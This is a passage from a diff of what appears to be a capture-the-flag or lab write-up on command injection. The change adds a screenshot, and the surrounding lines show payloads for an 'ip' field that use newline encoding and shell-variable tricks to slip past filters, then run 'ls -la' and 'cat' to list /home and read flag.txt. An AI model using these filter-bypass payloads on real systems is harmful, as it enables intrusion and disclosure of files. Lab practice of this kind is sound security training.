@@ -42,6 +42,8 @@ ip=127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
 
 ### Read the flag.txt file under /home
 
+<img width="1454" height="526" alt="image" src="https://github.com/user-attachments/assets/bc8194cb-fd92-4279-adb7-91e1ead75947" />
+
 ```
 127.0.0.1${LS_COLORS:10:1}%0ac"at"${IFS}${PATH:0:1}home
 
